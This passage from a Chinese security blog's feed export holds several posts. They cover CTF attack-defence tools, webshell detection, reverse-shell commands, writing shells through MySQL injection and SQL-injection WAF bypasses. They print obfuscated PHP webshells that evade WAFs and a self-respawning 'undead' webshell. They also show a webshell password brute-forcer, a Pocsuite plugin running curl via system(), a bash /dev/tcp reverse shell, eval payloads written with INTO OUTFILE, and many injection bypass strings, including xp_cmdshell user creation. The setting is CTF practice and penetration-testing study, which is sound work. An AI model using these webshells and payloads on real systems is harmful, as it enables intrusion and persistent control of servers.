"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1", "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0", "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6", "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",]&#125;headers = &#123;'User-Agent': random.choice(config['USER_AGENTS'])&#125;proxy = []conn = pymysql.connect( host='127.0.0.1', port=3306, user='root', passwd='123456', db='proxy', charset='utf8mb4', )cur = conn.cursor()#sql = "INSERT INTO proxylist(title,price) VALUES ('test2','200')"#cur.execute(sql)def proxy_spider(): url_xichi = 'http://www.xicidaili.com/nn/' r = requests.get(url=url_xichi,headers=headers) soup = bs(r.content,'lxml') datas = soup.find_all(name='tr',attrs=&#123;'class':re.compile('(odd)|()')&#125;) #print datas for data in datas: proxys = data.find_all(name='td') ip = str(proxys[1].string) #ip = 'http://'+ip port = str(proxys[2].string) type = str(proxys[5].string).lower() avail_proxy = proxy_check(ip,port,type) if avail_proxy != None: return avail_proxydef proxy_check(ip,port,type): url_check = 'http://ip.chinaz.com/getip.aspx' proxylist = &#123;&#125; proxylist[type] = '%s:%s' % (ip,port) #print proxylist try: r = requests.get(url=url_check,proxies=proxylist,timeout=5) find_ip = re.findall(r'\'(.*?)\'',r.text)[0] #print find_ip if ip == find_ip: return proxylist #proxy.append(find_ip) #print proxy except Exception,e: passdef decode_str(str): return str.replace(' ','').replace('\t','').replace('\n','').encode('utf-8')def get_title_price(url): proxy_url = proxy_spider() r = requests.get(url=url,proxies=proxy_url,timeout=20) content = r.content soup = bs(content,'lxml') content_titles = soup.find_all(name='a',attrs=&#123;'class':'link-dark'&#125;) content_prices = soup.find_all(name='span',attrs=&#123;'class':'price'&#125;) for title,price in zip(content_titles,content_prices): tmp_title = decode_str(str(title.string)) tmp_price = decode_str(str(price.string)) print tmp_title,tmp_price sql = "INSERT INTO proxylist(title,price) VALUES ('%s','%s')"%(tmp_title,tmp_price) cur.execute(sql)if __name__=='__main__': #proxy_spider() url_spider = 'http://edu.aqniu.com/course/explore?page=' for i in range(12): spider_url = url_spider+str(i) get_title_price(spider_url) time.sleep(random.random()*1) cur.close()]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下赛相关工具]]></title>
    <url>%2F2017%2F05%2F16%2FCTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。 一、linux tcpdump使用tcpdump的重要性不用我说了吧，都懂，但是在CTF中可能会没有权限使用。但是工作中肯定会用到的，相信我，不要为CTF而CTF…（不好意思扯淡了 =.=） 1.1、过滤主机抓取所有经过eth1，目的或源地址是192.168.1.1的网络数据​ tcpdump -i eth1 host 192.168.1.1指定源地址​ tcpdump -i eth1 src host 192.168.1.1指定目的地址​ tcpdump -i eth1 dst host 192.168.1.1 1.2、过滤端口抓取所有经过eth1，目的或源端口是25的网络数据​ tcpdump -i eth1 port 25指定源端口​ tcpdump -i eth1 src port 25指定目的端口​ tcpdump -i eth1 dst port 25 1.3、网络过滤tcpdump -i eth1 net 192.168 tcpdump -i eth1 src net 192.168 tcpdump -i eth1 dst net 192.168 1.4、协议过滤tcpdump -i eth1 arp tcpdump -i eth1 ip tcpdump -i eth1 tcp tcpdump -i eth1 udp tcpdump -i eth1 icmp 1.5、常用表达式非 : ! or &quot;not&quot; (去掉双引号) 且 : &amp;&amp; or &quot;and&quot; 或 : || or &quot;or&quot; 抓取所有经过eth1，目的地址是192.168.1.254或192.168.1.200端口是80的TCP数据​ tcpdump -i eth1 ‘((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))’抓取所有经过eth1，目标MAC地址是00:01:02:03:04:05的ICMP数据​ tcpdump -i eth1 ‘((icmp) and ((ether dst host 00:01:02:03:04:05)))’抓取所有经过eth1，目的网络是192.168，但目的主机不是192.168.1.200的TCP数据​ tcpdump -i eth1 ‘((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))’ 二、一句话木马一句话木马主要达到的目的就是就算别人看到了这个webshell，他们也不会用。不然别人直接利用你，用的webshell收割flag。我从自己搜集的过waf的webshell中挑了两个。12&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 原理我就不讲了，看一下你就明白了，很简单。QGV2YWwoJF9QT1NUWzBdKTs=随意变。菜刀配置填&lt;O&gt;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=&lt;/O&gt;连接密码:0（零）1&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?&gt; 菜刀连接密码:1，自己可以改改，主要学思路。 三、webshell爆破简单粗暴，只要发现，啥都不用想，拿起工具就是干！webshell爆破采用之前tools分享的思路，Apache一次允许同时提交1000个参数， IIS允许一次提交5883个参数。这里我主要用了两个，一个是K8写的GUI版本的，支持PHP、JSP、ASP、ASPX等一个是自己写的PHP的。主要代码如下： 123456789101112131415161718192021221000处理for i in range(0,dics): new_group = [] for m in range(i*1000,(i+1)*1000): new_group.append(group[m]) m += 1 for n in new_group: post_data[n] = 'echo "password is :%s";' % n req = requests.post(url,data=post_data) print u"正在进行第 %s 组字典爆破" % str(i + 1) print req.content+'****************************-SUCCESS!' post_data.clear()余数处理new_group1 = []for kk in range(dics*1000, len(content)): new_group1.append(group[kk]) kk += 1for each in new_group1: post_data[each] = 'echo "password is %s";' % eachr = requests.post(url,data=post_data)print u"正在进行余数字典爆破"print r.content+'****************************-SUCCESS!' 四、批量发包程序目的很简单，就是对所在网段的其他主机批量进行某一个操作，具体怎么做，拿它干嘛，看自己思维了。主要代码如下：12345678910111213def sender(domain): #proxies = &#123; "http": "http://127.0.0.1:8888"&#125; url = domain post_data ="password=ls" payload = "header test" headers = &#123;'content-type': payload,'User-Agent':random.choice(config['USER_AGENTS'])&#125; request = urllib2.Request(url,post_data,headers) response = urllib2.urlopen(request,timeout=config['timeout']) if response.getcode() == 200: res = response.read() return res else: return 0 加入了多线程，随机UA等(其实Python的多线程很鸡肋的，你要测试过对比下时间你就知道了。原因你可以查下进程、线程关于多核CPU的利用相关的一些资料)。 五、Pocsuite神器，就不解释了。其实原理很简单，做了个批量化的框架，自己写插件。主要验证代码如下：12345678910111213141516171819202122232425262728293031323334353637def _verify(self): import re result = &#123;&#125; webshellpath = "/ctf/webshell.php" # 配置webshell所在目录 payload = "&#123;domain&#125;" + webshellpath for pwd in self.pwdList: exp_url = payload.format(domain=self.url) + '?' + pwd + '=echo "dropsec";' print exp_url # exp_url = (payload.format(domain=self.url)) data = &#123; pwd : u'''echo "dropsec";''' &#125; try: response = req.post(exp_url, data=data, timeout=10, verify=False) except Exception, e: return self.parse_output(result) if response.status_code != 404: result['VerifyInfo'] = &#123;&#125; result['VerifyInfo']['status_code'] = response.status_code result['VerifyInfo']['is'] = 'password wrong' if 'dropsec' in response.content: result['VerifyInfo']['url'] = exp_url result['VerifyInfo']['is'] = 'password yes' data = &#123; pwd : u'''system('curl http://192.168.2.3:8080/ctf/webshell.php');''' #pwd : u'''system('curl http://10.0.1.2');''' &#125; try: response = req.post(exp_url, data=data, timeout=10, verify=False) result['VerifyInfo']['flag'] = response.content return self.parse_output(result) except Exception, e: return self.parse_output(result) return self.parse_output(result) 六、批量上传文件做这个的目的其实就是因为第一次玩CTF线下赛手速慢，为了以后不在因为这个问题在跌倒而做的。PS:其实这个小功能有时候还是很有用的。我多读书多，不骗你-.-{斜眼} 七、权限维持CTF的权限维持很简单啊，就是木马别被删不就好了。并不需要提权啊什么的啊{捂脸}，有时候你考虑问题要结合实际啊，咋简单就咋来嘛。就是做个不死马就好了。PS:这种小伎俩只是对付一般的CTF比赛，对那种赛棍肯定不适用了，人家写个条件竞争的，分分钟打哭你啊{捂脸}，所以还得看情况，该反弹还是要反弹啊。123456789101112&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); //file_put_contents(__FILE__,''); while(1)&#123; file_put_contents('C:\phpStudy\WWW\ctf\.config.php','&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[\'n985de9\'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;'); system('chmod 777 .config.php'); touch(".config.php",mktime(20,15,1,11,28,2016)); usleep(100); &#125;?&gt; 上传这个文件之后，批量访问，就会一直生成木马文件。PS：大家试想下，要是比赛中存在一个一句话后门，利用批量上传程序，将这个后门批量上上传到各个靶机上，再利用批量发包程序访问这个后门，再利用pocsuite,然后。。。哈哈哈，是不是很爽。(理想很丰满啊…) 八、日志记录主要是为了网站访问记录，便于后续的问题排查，就是把各种字段的数据记录下来。12345678910111213141516date_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"]; //访问IP$filename = $_SERVER['PHP_SELF']; //访问的文件$parameter = $_SERVER["QUERY_STRING"]; //查询的字符串$method = $_SERVER['REQUEST_METHOD']; //请求方法...$time = date('Y-m-d H:i:s',time()); //请求时间$post = file_get_contents("php://input",'r'); //接收POST数据$others = '**********************************************************************';$logadd = '访问时间：'.$time.'访问IP:'.$ip.'请求方法：'.$method.' '.'访问链接：'.$filename.'?'.$parameter."\r\n";...//记录写入$fh = fopen("log.txt", "a");fwrite($fh, $logadd);fwrite($fh,print_r($_COOKIE, true)."\r\n");fwrite($fh,$others."\r\n");fclose($fh); 九、文件监控网上自己搜搜吧，很多 十、WAF网上自己搜搜吧，很多 PS：九和十，注意分寸，不能影响正常业务的。 。。。 好久没写这么长的博客了。。。]]></content>
      <tags>
        <tag>编程</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>自动化</tag>
        <tag>tcpdump</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞挖掘之子域名采集]]></title>
    <url>%2F2017%2F04%2F29%2F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%87%E9%9B%86%2F</url>
    <content type="text"><![CDATA[准备准备东西，以后就开始正式挖洞了(之前都是野生的啊[捂脸])，整理下相关的知识，方便自己查看吧。(求大佬们的姿势 *&gt;*) 1、Web子域名猜测与访问尝试猜测一些可能的子域名，然后浏览器访问下看是否存在。 2、搜索引擎查询比如: site:163.com 3、查询DNS的一些解析记录比如查询 MX、CNAME 记录等 比如用 nslookup命令 nslookup -qt=any bing.com 4、爬虫爬取页面提取子域名可以利用爬虫从页面源代码中提取子域名 比如burp 的spider爬虫 5、crossdomain.xml 文件6、通过 IP 反查whois，站长工具等 7、通过 HTTPS 证书搜集https的站点都有证书 打开证书，查看详细信息-&gt;使用者可选名称-&gt;DNS Name 8、一些漏洞的利用如： DNS 域传送漏洞 nslookup set type=ns xxx.com server servers address set type=any ls -d xxx.com 在线工具： http://i.links.cn/subdomain/ 可查询二级、三级等子域名 http://dns.aizhan.com/ 查询同 IP 绑定了哪些域名 https://crt.sh/ 根据 HTTPS 证书查询子域名 https://crt.sh/?q=%25.baidu.com https://censys.io/certificates?q=.example.com Censys.io查询 本地工具 Layer 子域名挖掘机 wydomain 猪猪侠：https://github.com/ring04h/wydomain subDomainsBrute Sublist3r 集合google，bing，crt.sh等强大的根据 python sublist3r.py -d example.com theHarvester python theHarvester.py -d example.com -b all 这个工具有个比较好的它能够搜集目标的邮箱。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webshell查杀的新思路]]></title>
    <url>%2F2017%2F04%2F27%2FWebshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[由于学校要举办个CTF比赛，所以没办法必须参加。。。然后就是准备各种脚本了，关于webshell的查杀有了一个新的想法。最简单的一句话形如：&lt;?php @eval($_POST[&#39;pass&#39;])?&gt;，原理很简单首先$_POST会获取POST到服务器的参数名为pass的POST请求数据，然后函数eval会将$_POST获取的字符串按照PHP语法进行解析，这样我们通过各种PHP函数的组合使用就能通过中国菜刀等工具对服务器的文件等进行操作，这也就是常见一句话的工作原理。 这里我用两个i春秋上的过狗马来分析下：第一个：123456789101112131415161718&lt;?php$mt="mFsKCleRfU";$ojj="IEBleldle";$hsa="E9TVFsnd2VuJ10p";$fnx="Ow==";$zk = str_replace("d","","sdtdrd_redpdldadcde");//字符串替换：替换sdtdrd_redpdldadcde里的d为空 得到函数str_replace$ef = $zk("z", "", "zbazsze64_zdzeczodze");//调用$zk 字符串替换：替换zbazsze64_zdzeczodze里的z为空 得到base64_decode$dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");//调用$zk 字符串替换：替换pcprpepaptpe_fpupnpcptpipopn里的z为空 得到create_function创建匿名函数$zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));//分解步骤//$zvm=create_function(base64_decode(str_replace("le","","IEBleldlemFsKCleRfUE9TVFsnd2VuJ10pOw=="))) //拼接后的语句//$zvm=create_function(base64_decode(IEBldmFsKCRfUE9TVFsnd2VuJ10pOw==))) //执行完str_replace函数后，返回base64加密后的字符串//$zvm=create_function(@eval($_POST['wen'])); //执行完base64_decode 得到解密后的字符串 得到一句话木马 密码是wen$zvm(); //执行?&gt; 第二个：12345678910111213&lt;?php$uf="snd2Fqd";$ka="IEBldmFsK";$pjt="CRfUE9TVF";$vbl = str_replace("ti","","tistittirti_rtietipltiatice"); //空格替换ti str_replace$iqw="WVqaSddKTs=";$bkf = $vbl("k", "", "kbakske6k4k_kdkekckokdke"); //空格替换k base64_decode （base64加密）$sbp = $vbl("ctw","","ctwcctwrectwatctwectw_fctwuncctwtctwioctwn"); //空格替换ctw create_function$mpy = $sbp('', $bkf($vbl("b", "", $ka.$pjt.$uf.$iqw)));//$mpy =create_function('', base64_decode(str_replace("b", "",'IEBldmFsKCRfUE9TVFsnd2FqdWVqaSddKTs=')))//$mpy= @eval($_POST['wajueji']);$mpy();?&gt; 现在的webshell大部分都是回调函数，匿名函数，及一些PHP的特殊的函数，或者是PHP的特性。构造出无特征的webshell，传统的基于正则的webshell查杀对于这些webshell是无法查出的，根据在D盾中的测试，就算报出，也是级别为1，2的低级的，基本上咱们就忽略了。 咱们都知道传统的webshell查杀基本上都是基于正则库(这里不得不吐槽下公司的那个webshell查杀工具，真几把垃圾的不行)，为什么我们自己就能断定某个PHP脚本是是webshell呢？因为我们在自己的大脑中虚拟调试了这个PHP脚本，知道它是干嘛的了，所以这就是和工具的区别，所以我打算开发的webshell查杀就是基于虚拟执行和正则的webshell查杀。 比如我们那上面的第一个列子：如果我们echo $zk,$ef,$dva,$zvm则结果为：str_replace,base64_decode,create_function,create_function(@eval($_POST[&#39;wen&#39;]))这样在基于正则匹配之后是不是就很明显了。 再来看几个例子：12&lt;?php$sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 12&lt;?php$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?&gt; 按照这个思路是不是很容易检测了。再来看一个：123456&lt;?php$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 所以现在要做的就是找出脚本中所有的变量及匿名函数即可。]]></content>
      <tags>
        <tag>运维</tag>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于'万能密码'的思考]]></title>
    <url>%2F2017%2F04%2F25%2F%E5%85%B3%E4%BA%8E%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近在总结的时候，关于SQL万能密码方面的一些思考。SQL万能密码，想必大家都知道，比如像类似的admin&#39; or &#39;1&#39;=&#39;1&#39;--这样的代码，就是让SQL的表达式返回true。 从而达到逻辑正确。 我们常用的注释符有：%00,%80-%99---- +#等如果过滤了or,--,#等特殊字符的话，我们的常用的万能密码就不能使用了，根据之前做命令执行绕过的经验，使用payload：&#39;||&#39; 和万能密钥一样，先闭合前面的语句，后面的&#39;与原语句闭合得到一串字符串，我们知道字符串肯定是非0的，然后再||或运算符运算后，得到的永远是true。]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>SQL注入</tag>
        <tag>万能密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之反弹shell命令分析]]></title>
    <url>%2F2017%2F04%2F12%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[我们在对linux主机进行渗透测试的时候，经常回用到反弹shell,之前也没好好去研究、理解具体都是干什么的，就只知道会用…(so low…-.-)最基本的反弹shell的代码如下： bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1 咱们一步一步来分析： Step 1bash -i 这个大家都知道就是打开一个交互式的bash Step 2/dev/tcp 这个是linux中一个特殊的设备，打开这个文件就相当于建立了一个socket连接，对这个文件的读写就相当于在这个socket连接中传输数据。linux中还有和它一样的文件/dev/udp。 Step 3/192.168.1.1/8080 这个是表示远程主机及监听的端口。 Step 40&gt;&amp;1 首先科普下linux shell下常用的文件描述符： 标准输入(stdin): 代码为’0’,使用 &lt; 或 &lt;&lt; 标准输出(stdout): 代码为’1’,使用 &gt; 或 &gt;&gt; 标准错误输出(stderr): 代码为’2’,使用 2&gt; 或 2&gt;&gt; 经过查找发现：&gt;&amp;和&amp;&gt;的作用是一样的，即： 0&gt;&amp;1和0&lt;&amp;1是一个意思，都是将标准输入重定向到标准输出中。 Step 5OVER!好奇心真的很有用啊! )_(]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL写shell的一些tips]]></title>
    <url>%2F2017%2F04%2F01%2FMySQL%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[通过注入写shell，首先需要找到网站的绝对路径。 一、找路径1.报错tips：有时候information_schema.tables不能用时，在MySQL 5.6及以上版本中可以使用以下表12?id=1' union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&amp;Submit=Submit%23?id=1' union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()%23&amp;Submit=Submit%23 2.phpinfo3.load_file1SELECT LOAD_FILE('/etc/apache2/sites-available/default'); tips：有时候过滤了敏感路径可以试试这样：1SELECT LOAD_FILE('/etc/sb/../passwd'); 4.数组1user[]=1&amp;passwd[]=1 5.通过mysql函数 查找mysql安装目录1show variables like 'datadir'; 二、写shell1.获取mysql.user和文件权限12select group_concat(user,0x3a,file_priv) from mysql.user;出现Y，这就代表你有文件权限，N就是没有 2.写shell123select'&lt;?php @eval($_POST[-77]);?&gt;'INTO OUTFILE 'E:\Web\errors.php'如果不成功，可能转义了。select'&lt;?php @eval($_POST[-77]);?&gt;'INTO OUTFILE 'E:\\Web\\errors.php' 最好还是把内容编码下。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>webshell</tag>
        <tag>MySQL</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入-绕过]]></title>
    <url>%2F2017%2F03%2F21%2FSQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[整理下关于SQL注入绕过的一些姿势。欢迎大牛补充 !^—^! 0x01 绕过waf思路从第一步起，一点一点去分析，然后绕过。 过滤 and,or 123preg_match('/(and|or)/i', $id)Filtered injection: 1 or 1 = 1 1 and 1 = 1Bypassed injection: 1 || 1 = 1 1 &amp;&amp; 1 = 1 过滤 and, or, union 123preg_match('/(and|or|union)/i', $id)Filtered injection: union select user, password from usersBypassed injection: 1 || (select user from users where user_id = 1) = 'admin' 过滤 and, or, union, where 123preg_match('/(and|or|union|where)/i', $id)Filtered injection: 1 || (select user from users where user_id = 1) = 'admin'Bypassed injection: 1 || (select user from users limit 1) = 'admin' 过滤 and, or, union, where, limit 123preg_match('/(and|or|union|where|limit)/i', $id)Filtered injection: 1 || (select user from users limit 1) = 'admin'Bypassed injection: 1 || (select user from users group by user_id having user_id = 1) = 'admin' 过滤 and, or, union, where, limit, group by 123preg_match('/(and|or|union|where|limit|group by)/i', $id)Filtered injection: 1 || (select user from users group by user_id having user_id = 1) = 'admin'Bypassed injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1 过滤 and, or, union, where, limit, group by, select 1234preg_match('/(and|or|union|where|limit|group by|select)/i', $id)Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1Bypassed injection: 1 || 1 = 1 into outfile 'result.txt'Bypassed injection: 1 || substr(user,1,1) = 'a' 过滤 and, or, union, where, limit, group by, select, ‘ 12345preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1Bypassed injection: 1 || user_id is not nullBypassed injection: 1 || substr(user,1,1) = 0x61Bypassed injection: 1 || substr(user,1,1) = unhex(61) 过滤 and, or, union, where, limit, group by, select, ‘, hex 123preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)Filtered injection: 1 || substr(user,1,1) = unhex(61)Bypassed injection: 1 || substr(user,1,1) = lower(conv(11,10,36)) 过滤 and, or, union, where, limit, group by, select, ‘, hex, substr 123preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)Filtered injection: 1 || substr(user,1,1) = lower(conv(11,10,36))Bypassed injection: 1 || lpad(user,7,1) 过滤 and, or, union, where, limit, group by, select, ‘, hex, substr, 空格 123preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)Filtered injection: 1 || lpad(user,7,1)ypassed injection: 1%0b||%0blpad(user,7,1) 0x02 正则绕过根据正则的的模糊匹配特性绕过，比如过滤了’=’filtered injection: 1 or 1 = 1Bypassed injection: 1 or 1,1 or ‘1’,1 or char(97)123456eg:filtered injection: 1 union select 1, table_name from information_schema.tables where table_name = 'users'Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7aBypassed Injection: 1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273 0x03 通用绕过1.注释符 ?id=1+un//ion+se//lect+1,2,3– 2.大小写 ?id=1+UnIoN//SeLecT//1,2,3– 3.关键字替换有些waf等使用preg_replace替换了SQL关键字12?id=1+UNunionION+SEselectLECT+1,2,3--?id=1+uni%0bon+se%0blect+1,2,3-- 有时候注释符’/**/‘可能被过滤，也可以使用%0b绕过12Forbidden: http://localhost/id/1/**/||/**/lpad(first_name,7,1).htmlBypassed : http://localhost/id/1%0b||%0blpad(first_name,7,1).html 4.编码一个经典的脚本：Nukesentinel.php123456789101112131415// Check for UNION attack // Copyright 2004(c) Raven PHP Scripts $blocker_row = $blocker_array[1]; if($blocker_row['activate'] &gt; 0) &#123; if (stristr($nsnst_const['query_string'],'+union+') OR \ stristr($nsnst_const['query_string'],'%20union%20') OR \ stristr($nsnst_const['query_string'],'*/union/*') OR \ stristr($nsnst_const['query_string'],' union ') OR \ stristr($nsnst_const['query_string_base64'],'+union+') OR \ stristr($nsnst_const['query_string_base64'],'%20union%20') OR \ stristr($nsnst_const['query_string_base64'],'*/union/*') OR \ stristr($nsnst_const['query_string_base64'],' union ')) &#123; // block_ip($blocker_row); die("BLOCK IP 1 " ); &#125; &#125; 123Forbidden: http://localhost/php/?/**/union/**/selectBypassed : http://localhost/php/?/%2A%2A/union/%2A%2A/selectBypassed : http://localhost/php/?%2f**%2funion%2f**%2fselect 5.缓冲区溢出 http://localhost/news.php?id=1+and+(select 1)=(select 0xA*1000)+union+select+1,2,version(),database(),user(),6,7,8,9,10– 6.内联注释(mysql)12http://localhost/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--http://localhost/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()-- 0x04 高级绕过1.HPP（http参数污染)举个例子：index.php?par1=val1&amp;par1=val2| web server | par1 || :— | :— || ASP.NET/IIS | val1,val2 || ASP/IIS | val1,val2 || PHP/Apache | val2 || JSP/Tomcat | val1 |eg:在ASP/ASP.NET的环境下1234Forbidden: http://localhost/search.aspx?q=select name,password from usersBypassed : http://localhost/search.aspx?q=select name&amp;q=password from usersBypassed : http://localhost/search.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/usersBypassed : http://localhost/news.aspx?id=1'; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user test test /*&amp;id=1*/ -- 2.HPC(http参数污染)RFC2396定义了如下一些字符：123Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()Reserved : ; / ? : @ &amp; = + $ ,Unwise : &#123; &#125; | \ ^ [ ] ` 不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：| Query String | Apache/2.2.16,PHP/5.3.3 | IIS6/ASP || :— | :— | :— || ?test[1=2 | test_1=2 | test[1=2 || ?test=% | test=% | test= || ?test%00=1 | test= | test=1 || ?test=1%001 | NULL | test=1 || ?test+d=1+2 | test_d=1 2 | test d=1 2 |eg:123456Forbidden: http://localhost/?xp_cmdshellBypassed : http://localhost/?xp[cmdshellForbidden: http://localhost/test.asp?file=../flag.txtBypassed : http://localhost/test.asp?file=.%./flag.txtForbidden: http://localhost/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)Bypassed : http://localhost/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含-Tips]]></title>
    <url>%2F2017%2F03%2F21%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Tips%2F</url>
